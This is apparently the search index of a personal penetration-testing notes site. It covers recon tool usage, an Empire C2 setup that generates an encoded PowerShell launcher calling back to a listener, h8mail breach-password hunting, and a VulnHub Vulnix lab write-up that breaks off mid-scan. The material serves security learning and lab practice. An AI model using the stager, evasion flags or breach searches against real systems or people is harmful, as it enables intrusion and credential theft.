[
{
	"uri": "https://dev-hugo.justin-p.me/",
	"title": "",
	"tags": [],
	"description": "",
	"content": "My notes and snippets   Commands   Commands\n   Guides   Guides.\n   Notes   Notes description.\n   Tools   Tools description.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/identify-website-technologies/",
	"title": "Identify Website Technologies",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/",
	"title": "Tags",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/whatweb/",
	"title": "whatweb",
	"tags": ["Identify Website Technologies"],
	"description": "WhatWeb identifies websites.",
	"content": "whatweb Installation  Usage whatweb [options] \u0026lt;URLs\u0026gt;  Flags TARGET SELECTION: \u0026lt;TARGETs\u0026gt; Enter URLs, hostnames, IP addresses, filenames or IP ranges in CIDR, x.x.x-x, or x.x.x.x-x.x.x.x format. --input-file=FILE, -i Read targets from a file. You can pipe hostnames or URLs directly with -i /dev/stdin. TARGET MODIFICATION: --url-prefix Add a prefix to target URLs. --url-suffix Add a suffix to target URLs. --url-pattern Insert the targets into a URL. Requires --input-file, eg. www.example.com/%insert%/robots.txt AGGRESSION: The aggression level controls the trade-off between speed/stealth and reliability. --aggression, -a=LEVEL Set the aggression level. Default: 1. Aggression levels are: 1. Stealthy Makes one HTTP request per target. Also follows redirects. 3. Aggressive If a level 1 plugin is matched, additional requests will be made. 4. Heavy Makes a lot of HTTP requests per target. Aggressive tests from all plugins are used for all URLs. HTTP OPTIONS: --user-agent, -U=AGENT Identify as AGENT instead of WhatWeb/0.5.1. --header, -H Add an HTTP header. eg \u0026quot;Foo:Bar\u0026quot;. Specifying a default header will replace it. Specifying an empty value, eg. \u0026quot;User-Agent:\u0026quot; will remove the header. --follow-redirect=WHEN Control when to follow redirects. WHEN may be 'never', `http-only', `meta-only', `same-site', or `always'. Default: always. --max-redirects=NUM Maximum number of contiguous redirects. Default: 10. AUTHENTICATION: --user, -u=\u0026lt;user:password\u0026gt; HTTP basic authentication. --cookie, -c=COOKIES Provide cookies, e.g. 'name=value; name2=value2'. --cookiejar=FILE Read cookies from a file. PROXY: --proxy \u0026lt;hostname[:port]\u0026gt; Set proxy hostname and port. Default: 8080. --proxy-user \u0026lt;username:password\u0026gt; Set proxy user and password. PLUGINS: --list-plugins, -l List all plugins. --info-plugins, -I=[SEARCH] List all plugins with detailed information. Optionally search with keywords in a comma delimited list. --search-plugins=STRING Search plugins for a keyword. --plugins, -p=LIST Select plugins. LIST is a comma delimited set of selected plugins. Default is all. Each element can be a directory, file or plugin name and can optionally have a modifier, eg. + or - Examples: +/tmp/moo.rb,+/tmp/foo.rb title,md5,+./plugins-disabled/ ./plugins-disabled,-md5 -p + is a shortcut for -p +plugins-disabled. --grep, -g=STRING|REGEXP Search for STRING or a Regular Expression. Shows only the results that match. Examples: --grep \u0026quot;hello\u0026quot; --grep \u0026quot;/he[l]*o/\u0026quot; --custom-plugin=DEFINITION\\tDefine a custom plugin named Custom-Plugin, --custom-plugin=DEFINITION Define a custom plugin named Custom-Plugin, Examples: \u0026quot;:text=\u0026gt;'powered by abc'\u0026quot; \u0026quot;:version=\u0026gt;/powered[ ]?by ab[0-9]/\u0026quot; \u0026quot;:ghdb=\u0026gt;'intitle:abc \\\u0026quot;powered by abc\\\u0026quot;'\u0026quot; \u0026quot;:md5=\u0026gt;'8666257030b94d3bdb46e05945f60b42'\u0026quot; --dorks=PLUGIN List Google dorks for the selected plugin. OUTPUT: --verbose, -v Verbose output includes plugin descriptions. Use twice for debugging. --colour,--color=WHEN control whether colour is used. WHEN may be 'never', 'always', or 'auto'. --quiet, -q Do not display brief logging to STDOUT. --no-errors Suppress error messages. LOGGING: --log-brief=FILE Log brief, one-line output. --log-verbose=FILE Log verbose output. --log-errors=FILE Log errors. --log-xml=FILE Log XML format. --log-json=FILE Log JSON format. --log-sql=FILE Log SQL INSERT statements. --log-sql-create=FILE Create SQL database tables. --log-json-verbose=FILE Log JSON Verbose format. --log-magictree=FILE Log MagicTree XML format. --log-object=FILE Log Ruby object inspection format. --log-mongo-database Name of the MongoDB database. --log-mongo-collection Name of the MongoDB collection. Default: whatweb. --log-mongo-host MongoDB hostname or IP address. Default: 0.0.0.0. --log-mongo-username MongoDB username. Default: nil. --log-mongo-password MongoDB password. Default: nil. --log-elastic-index Name of the index to store results. Default: whatweb --log-elastic-host Host:port of the elastic http interface. Default: 127.0.0.1:9200 PERFORMANCE \u0026amp; STABILITY: --max-threads, -t Number of simultaneous threads. Default: 25. --open-timeout Time in seconds. Default: 15. --read-timeout Time in seconds. Default: 30. --wait=SECONDS Wait SECONDS between connections. This is useful when using a single thread. HELP \u0026amp; MISCELLANEOUS: --short-help Short usage help. --help, -h Complete usage help. --debug Raise errors in plugins. --version Display version information. (WhatWeb 0.5.1).  Examples whatweb https://justin-p.me  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/nmap/",
	"title": "Nmap",
	"tags": ["Port Discovery"],
	"description": "Nmap description.",
	"content": "Nmap Installation apt install nmap  Usage nmap [Scan Type(s)] [Options] {target specification}  Flags TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL \u0026lt;inputfilename\u0026gt;: Input from list of hosts/networks -iR \u0026lt;num hosts\u0026gt;: Choose random targets --exclude \u0026lt;host1[,host2][,host3],...\u0026gt;: Exclude hosts/networks --excludefile \u0026lt;exclude_file\u0026gt;: Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers \u0026lt;serv1[,serv2],...\u0026gt;: Specify custom DNS servers --system-dns: Use OSs DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags \u0026lt;flags\u0026gt;: Customize TCP scan flags -sI \u0026lt;zombie host[:probeport]\u0026gt;: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b \u0026lt;FTP relay host\u0026gt;: FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p \u0026lt;port ranges\u0026gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports \u0026lt;port ranges\u0026gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - dont randomize --top-ports \u0026lt;number\u0026gt;: Scan \u0026lt;number\u0026gt; most common ports --port-ratio \u0026lt;ratio\u0026gt;: Scan ports more common than \u0026lt;ratio\u0026gt; SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity \u0026lt;level\u0026gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script=default --script=\u0026lt;Lua scripts\u0026gt;: \u0026lt;Lua scripts\u0026gt; is a comma separated list of directories, script-files or script-categories --script-args=\u0026lt;n1=v1,[n2=v2,...]\u0026gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=\u0026lt;Lua scripts\u0026gt;: Show help about scripts. \u0026lt;Lua scripts\u0026gt; is a comma-separated list of script-files or script-categories. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take \u0026lt;time\u0026gt; are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T\u0026lt;0-5\u0026gt;: Set timing template (higher is faster) --min-hostgroup/max-hostgroup \u0026lt;size\u0026gt;: Parallel host scan group sizes --min-parallelism/max-parallelism \u0026lt;numprobes\u0026gt;: Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout \u0026lt;time\u0026gt;: Specifies probe round trip time. --max-retries \u0026lt;tries\u0026gt;: Caps number of port scan probe retransmissions. --host-timeout \u0026lt;time\u0026gt;: Give up on target after this long --scan-delay/--max-scan-delay \u0026lt;time\u0026gt;: Adjust delay between probes --min-rate \u0026lt;number\u0026gt;: Send packets no slower than \u0026lt;number\u0026gt; per second --max-rate \u0026lt;number\u0026gt;: Send packets no faster than \u0026lt;number\u0026gt; per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu \u0026lt;val\u0026gt;: fragment packets (optionally w/given MTU) -D \u0026lt;decoy1,decoy2[,ME],...\u0026gt;: Cloak a scan with decoys -S \u0026lt;IP_Address\u0026gt;: Spoof source address -e \u0026lt;iface\u0026gt;: Use specified interface -g/--source-port \u0026lt;portnum\u0026gt;: Use given port number --proxies \u0026lt;url1,[url2],...\u0026gt;: Relay connections through HTTP/SOCKS4 proxies --data \u0026lt;hex string\u0026gt;: Append a custom payload to sent packets --data-string \u0026lt;string\u0026gt;: Append a custom ASCII string to sent packets --data-length \u0026lt;num\u0026gt;: Append random data to sent packets --ip-options \u0026lt;options\u0026gt;: Send packets with specified ip options --ttl \u0026lt;val\u0026gt;: Set IP time-to-live field --spoof-mac \u0026lt;mac address/prefix/vendor name\u0026gt;: Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG \u0026lt;file\u0026gt;: Output scan in normal, XML, s|\u0026lt;rIpt kIddi3, and Grepable format, respectively, to the given filename. -oA \u0026lt;basename\u0026gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume \u0026lt;filename\u0026gt;: Resume an aborted scan --stylesheet \u0026lt;path/URL\u0026gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir \u0026lt;dirname\u0026gt;: Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page.  Examples General scan nmap -T4 -A -oA outputfolder 10.10.10.10  Scan for all TCP ports nmap -T4 -p- -A 10.10.10.10  General UDP scan nmap -T4 -p -sU 10.10.10.10  ARP scan nmap -n -sn -PR 10.10.10.0/24  Host discovery ARP,ICMP,SYN 443/tcp, ACK 80/tcp\nnmap -n -sn 10.10.10.10  Also see  Nmap site  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/port-discovery/",
	"title": "Port Discovery",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/e-mail-gathering/",
	"title": "E-Mail Gathering",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/theharvester/",
	"title": "theHarvester",
	"tags": ["E-Mail Gathering"],
	"description": "theHarvester gathers emails, names, subdomains, IPs and URLs using multiple public data sources.",
	"content": "theHarvester Installation git clone https://github.com/laramies/theHarvester cd theHarvester python3 -m pip install -r requirements/base.txt python3 theHarvester.py -h  Usage theHarvester -d [domain] -l [depth] -b [search engine name]  Flags -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn't use this option) -h: use SHODAN database to query discovered hosts  Examples Scan domain on google theHarvester -d justin-p.me -l 500 -b google  Save results in a HTML and XML file theHarvester -d justin-p.me -l 500 -b google -f exportfile  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/amass/",
	"title": "amass",
	"tags": ["DNS Recon"],
	"description": "amass description.",
	"content": "amass Installation  Usage  Flags  Examples The most basic use of the tool for subdomain enumeration amass enum -d example.com  Typical parameters for DNS enumeration amass enum -v -src -ip -brute -min-for-recursive 2 -d example.com  Also see  Github Documentation  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/dns-recon/",
	"title": "DNS Recon",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/psdnsdumpsterapi/",
	"title": "PSDNSDumpsterAPI",
	"tags": ["DNS Recon"],
	"description": "(Unofficial) PowerShell API for htttps://www.dnsdumpster.com.",
	"content": "PSDNSDumpsterAPI Installation Install-Module PSDNSDumpsterAPI  Usage Invoke-PSDNSDumpsterAPI -Domain 'domain.tld'  Flags .PARAMETER Domains One or more domains to get DNSDumpster results for.  Examples Return the results from dnsdumpster as a PSObject $DomainInfo=Invoke-PSDnsDumpsterAPI -Domains 'justin-p.me'  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/sublist3r/",
	"title": "sublist3r",
	"tags": ["DNS Recon"],
	"description": "sublist3r description.",
	"content": "Sublist3r Installation  Usage  Flags  Examples Enumerate subdomains of specific domain sublist3r -d example.com  Show only subdomains which have ports 80 and 443 open sublist3r -d example.com -p 80,443  Save results in txt file sublist3r -d example.com -o ~/output/file.txt  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/credential-gathering/",
	"title": "Credential Gathering",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/h8mail/",
	"title": "h8mail",
	"tags": ["Credential Gathering"],
	"description": "Password Breach Hunting &amp; Email OSINT tool, locally or using premium services. Supports chasing down related email.",
	"content": "h8mail h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt\u0026rsquo;s \u0026ldquo;Collection1\u0026rdquo; and the infamous \u0026ldquo;Breach Compilation\u0026rdquo; torrent.\nInstallation pip3 install h8mail  Usage usage: h8mail [-h] [-t USER_TARGETS [USER_TARGETS ...]] [-u USER_URLS [USER_URLS ...]] [-q USER_QUERY] [--loose] [-c CONFIG_FILE [CONFIG_FILE ...]] [-o OUTPUT_FILE] [-bc BC_PATH] [-sk] [-k CLI_APIKEYS [CLI_APIKEYS ...]] [-lb LOCAL_BREACH_SRC [LOCAL_BREACH_SRC ...]] [-gz LOCAL_GZIP_SRC [LOCAL_GZIP_SRC ...]] [-sf] [-ch [CHASE_LIMIT]] [--power-chase] [--hide] [--debug] [--gen-config]  Flags optional arguments: -h, --help show this help message and exit -t USER_TARGETS [USER_TARGETS ...], --targets USER_TARGETS [USER_TARGETS ...] Either string inputs or files. Supports email pattern matching from input or file, filepath globing and multiple arguments -u USER_URLS [USER_URLS ...], --url USER_URLS [USER_URLS ...] Either string inputs or files. Supports URL pattern matching from input or file, filepath globing and multiple arguments. Parse URLs page for emails. Requires http:// or https:// in URL. -q USER_QUERY, --custom-query USER_QUERY Perform a custom query. Supports username, password, ip, hash, domain. Performs an implicit \u0026quot;loose\u0026quot; search when searching locally --loose Allow loose search by disabling email pattern recognition. Use spaces as pattern seperators -c CONFIG_FILE [CONFIG_FILE ...], --config CONFIG_FILE [CONFIG_FILE ...] Configuration file for API keys. Accepts keys from Snusbase, WeLeakInfo, Leak-Lookup, HaveIBeenPwned, Emailrep, Dehashed and hunterio -o OUTPUT_FILE, --output OUTPUT_FILE File to write CSV output -bc BC_PATH, --breachcomp BC_PATH Path to the breachcompilation torrent folder. Uses the query.sh script included in the torrent -sk, --skip-defaults Skips HaveIBeenPwned and HunterIO check. Ideal for local scans -k CLI_APIKEYS [CLI_APIKEYS ...], --apikey CLI_APIKEYS [CLI_APIKEYS ...] Pass config options. Supported format: \u0026quot;K=V,K=V\u0026quot; -lb LOCAL_BREACH_SRC [LOCAL_BREACH_SRC ...], --local-breach LOCAL_BREACH_SRC [LOCAL_BREACH_SRC ...] Local cleartext breaches to scan for targets. Uses multiprocesses, one separate process per file, on separate worker pool by arguments. Supports file or folder as input, and filepath globing -gz LOCAL_GZIP_SRC [LOCAL_GZIP_SRC ...], --gzip LOCAL_GZIP_SRC [LOCAL_GZIP_SRC ...] Local tar.gz (gzip) compressed breaches to scans for targets. Uses multiprocesses, one separate process per file. Supports file or folder as input, and filepath globing. Looks for 'gz' in filename -sf, --single-file If breach contains big cleartext or tar.gz files, set this flag to view the progress bar. Disables concurrent file searching for stability -ch [CHASE_LIMIT], --chase [CHASE_LIMIT] Add related emails from hunter.io to ongoing target list. Define number of emails per target to chase. Requires hunter.io private API key --power-chase Add related emails from ALL API services to ongoing target list. Use with --chase. Requires a private API key --hide Only shows the first 4 characters of found passwords to output. Ideal for demonstrations --debug Print request debug information --gen-config, -g Generates a configuration file template in the current working directory \u0026amp; exits. Will overwrite existing h8mail_config.ini file  Examples Query for a single target h8mail -t target@example.com  Query for list of targets, indicate config file for API keys, output to pwned_targets.csv h8mail -t targets.txt -c config.ini -o pwned_targets.csv  Query a list of targets without making API calls against local copy of the Breach Compilation h8mail -t targets.txt -bc ../Downloads/BreachCompilation/ -sk  Search every .gz file for targets found in targets.txt locally h8mail -t targets.txt -gz /tmp/Collection1/ -sk  Also see  Github  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/networking/osi-model/layer4/",
	"title": "Layer 4",
	"tags": ["OSI Model"],
	"description": "Reliable transmission of data segments between points on a network, including segmentation, acknowledgement and multiplexing.",
	"content": "Layer 4 TCP Transmission Control Protocol (TCP) is one of the main protocols of the \u0026lsquo;Internet protocol suite\u0026rsquo;.\nTCP provides reliable, ordered, and error-checked delivery of a stream of octets (bytes) between applications running on hosts communicating via an IP network. Major internet applications such as the HTTP, SMTP, SSH, and SFTP rely on TCP. SSL/TLS often runs on top of TCP.\nTCP is connection-oriented. A connection between client and server is established before data can be sent, this connection establisment is called the Three-way handshake.\nThree-way handshake, retransmission, and error-detection adds to reliability but lengthens latency. Applications that do not require reliable data stream service may use the User Datagram Protocol (UDP), which provides a connectionless datagram service that prioritizes time over reliability.\nTCP employs network congestion avoidance. However, there are vulnerabilities to TCP including denial of service, connection hijacking, TCP veto, and reset attack. For network security, monitoring, and debugging, TCP traffic can be intercepted and logged with a packet sniffer.\nThree-way handshake    Steps     Host A sends a TCP SYNchronize packet to Host B   Host B receives A\u0026rsquo;s SYN   Host B sends a SYNchronize-ACKnowledgement   Host A receives B\u0026rsquo;s SYN-ACK   Host A sends ACKnowledge   Host B receives ACK.   TCP socket connection is ESTABLISHED.    UDP User Datagram Protocol (UDP) is one of the core members of the \u0026lsquo;Internet protocol suite\u0026rsquo;.\nWith UDP computer applications can send messages, in this case referred to as datagrams,to other hosts on an Internet Protocol (IP) network. Prior communications are not required in order to set up communication channels or data paths. UDP uses a simple connectionless communication model with a minimum of protocol mechanisms.\nUDP provides checksums for data integrity, and port numbers for addressing different functions at the source and destination of the datagram. It has no handshaking dialogues, and thus exposes the user\u0026rsquo;s program to any unreliability of the underlying network; there is no guarantee of delivery, ordering, or duplicate protection, like there is with TCP.\nPorts TCP vs UDP "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/osi-model/",
	"title": "OSI Model",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/c2-frameworks/",
	"title": "C2 Frameworks",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-c2-frameworks/empire/",
	"title": "empire",
	"tags": ["C2 Frameworks"],
	"description": "empire description.",
	"content": "empire Install System git clone https://github.com/BC-SECURITY/Empire cd Empire sudo ./setup/install.sh  Docker docker pull bcsecurity/empire:{version} docker run -it bcsecurity/empire:{version} # with persistent storage docker pull bcsecurity/empire:{version} docker create -v /empire --name data bcsecurity/empire:{version} docker run -it --volumes-from data bcsecurity/empire:{version} # if you prefer to be dropped into bash instead of directly into empire docker run -it --volumes-from data bcsecurity/empire:{version} /bin/bash  Examples Reset DB /empire/setup/reset.sh  setup basic listener and gen launcher (Empire) \u0026gt; listeners [!] No listeners currently active (Empire: listeners) \u0026gt; uselistener http (Empire: listeners/http) \u0026gt; set Host http://10.10.14.24:80 (Empire: listeners/http) \u0026gt; set BindIP 10.10.14.24 (Empire: listeners/http) \u0026gt; set Port 80 (Empire: listeners/http) \u0026gt; execute [*] Starting listener 'http' * Serving Flask app \u0026quot;http\u0026quot; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off [+] Listener successfully started! (Empire: listeners/http) \u0026gt; back (Empire: listeners) \u0026gt; launcher [!] Please enter 'launcher \u0026lt;language\u0026gt; \u0026lt;listenerName\u0026gt;' (Empire: listeners) \u0026gt; launcher powershell http powershell -noP -sta -w 1 -enc SQBmACgAJABQAF.....kAEsAKQApAHwASQBFAFgA  Also see  Github project Quickstart  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/main-page/",
	"title": "Main Page",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/",
	"title": "Tools",
	"tags": ["Main Page"],
	"description": "Tools description.",
	"content": "Tools   \u0026#39;C2 Frameworks\u0026#39;   C2 Frameworks description.\n   \u0026#39;Forensic\u0026#39;   forensic description.\n   \u0026#39;Steganography\u0026#39;   Steganography description.\n   amass   amass description.\n   h8mail   Password Breach Hunting \u0026amp; Email OSINT tool, locally or using premium services. Supports chasing down related email.\n   nc   nc description.\n   Nmap   Nmap description.\n   openssl   openssl description.\n   PSDNSDumpsterAPI   (Unofficial) PowerShell API for htttps://www.dnsdumpster.com.\n   sublist3r   sublist3r description.\n   theHarvester   theHarvester gathers emails, names, subdomains, IPs and URLs using multiple public data sources.\n   whatweb   WhatWeb identifies websites.\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/",
	"title": "Notes",
	"tags": ["Main Page"],
	"description": "Notes description.",
	"content": "Notes   Courses   Notes from cources I did.\n   CTFs   Notes and (semi-) Writeups of CTFs\n   Exploit Development   Bufferoverflows and the like.\n   Hacking Methodology   Hacking Methodology, what, how and when todo what.\n   Networking   Networking description.\n   Programming   Programming description.\n   Z_Private   Private notes\n  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/vulnhub/",
	"title": "VulnHub",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/vulnix/",
	"title": "Vulnix",
	"tags": ["VulnHub"],
	"description": "Notes from the Vulnix machine from Vulnhub.",
	"content": "vulnix    Proto port Service/URL Info Potential Vulns Verified Vulns    where you at root@kali:~/Documents/vulnix# nmap -sn -PR 192.168.88.128/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:35 CET Nmap scan report for 192.168.88.2 Host is up (0.00018s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.134 Host is up (0.00099s latency). MAC Address: 00:0C:29:76:09:06 (VMware) Nmap scan report for 192.168.88.254 Host is up (0.00062s latency). MAC Address: 00:50:56:F7:8F:D0 (VMware) Nmap scan report for 192.168.88.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.11 seconds  192.168.88.134\nwhat you got TCP root@kali:~/Documents/vulnix# nmap -p- -A 192.168.88.134 -oA tcp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:39 CET Scan Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan Nmap scan report for 192.168.88.134 Host is up (0.00061s latency). Not shown: 65518 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA) | 2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA) |_ 256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, |_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time. 79/tcp open fingerLinux fingerd |_finger: No one logged on.\\x0D 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: SASL STLS CAPA RESP-CODES UIDL TOP PIPELINING |_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time. 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4111/tcp6 rpcbind | 100000 3,4111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 40412/udp mountd | 100005 1,2,3 51233/tcp6 mountd | 100005 1,2,3 57722/tcp mountd | 100005 1,2,3 59004/udp6 mountd | 100021 1,3,4 37539/tcp6 nlockmgr | 100021 1,3,4 42654/udp nlockmgr | 100021 1,3,4 49656/udp6 nlockmgr | 100021 1,3,4 54775/tcp nlockmgr | 100024 138568/tcp status | 100024 150138/udp status | 100024 154698/udp6 status | 100024 157281/tcp6 status | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 143/tcp open imap Dovecot imapd |_imap-capabilities: ID LOGIN-REFERRALS listed STARTTLS LOGINDISABLEDA0001 IDLE ENABLE have post-login OK capabilities SASL -IR Pre-login LITERAL+ more IMAP4rev1 |_ssl-date: 2020-01-05T15:40:19+00:00; +6s from scanner time. 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open tcpwrapped 993/tcp open ssl/imaps? |_ssl-date: 2020-01-05T15:40:18+00:00; +5s from scanner time. 995/tcp open ssl/pop3s? |_ssl-date: 2020-01-05T15:40:18+00:00; +5s from scanner time. 2049/tcp open nfs_acl 2-3 (RPC #100227) 38568/tcp open status1 (RPC #100024) 38839/tcp open mountd1-3 (RPC #100005) 54775/tcp open nlockmgr 1-4 (RPC #100021) 57722/tcp open mountd1-3 (RPC #100005) 59621/tcp open mountd1-3 (RPC #100005) MAC Address: 00:0C:29:76:09:06 (VMware) Device type: general purpose Running: Linux 2.6.X|3.X OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 OS details: Linux 2.6.32 - 3.10 Network Distance: 1 hop Service Info: Host: vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 5s, deviation: 0s, median: 5s TRACEROUTE HOP RTTADDRESS 1 0.61 ms 192.168.88.134 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 213.68 seconds  UDP root@kali:~/Documents/vulnix# nmap -sU -A 192.168.88.134 -oA udp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:37 CET Nmap scan report for 192.168.88.134 Host is up (0.00087s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 68/udp open|filtered dhcpc 111/udp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 40412/udp mountd | 100005 1,2,3 51233/tcp6 mountd | 100005 1,2,3 57722/tcp mountd | 100005 1,2,3 59004/udp6 mountd | 100021 1,3,4 37539/tcp6 nlockmgr | 100021 1,3,4 42654/udp nlockmgr | 100021 1,3,4 49656/udp6 nlockmgr | 100021 1,3,4 54775/tcp nlockmgr | 100024 1 38568/tcp status | 100024 1 50138/udp status | 100024 1 54698/udp6 status | 100024 1 57281/tcp6 status | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 2049/udp open nfs_acl 2-3 (RPC #100227) MAC Address: 00:0C:29:76:09:06 (VMware) Too many fingerprints match this host to give specific OS details Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.87 ms 192.168.88.134 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1202.51 seconds  Finger me pls root@kali:~/Documents/vulnix# nc 192.168.88.134 79 root Login: root Name: root Directory: /root Shell: /bin/bash Never logged in. No 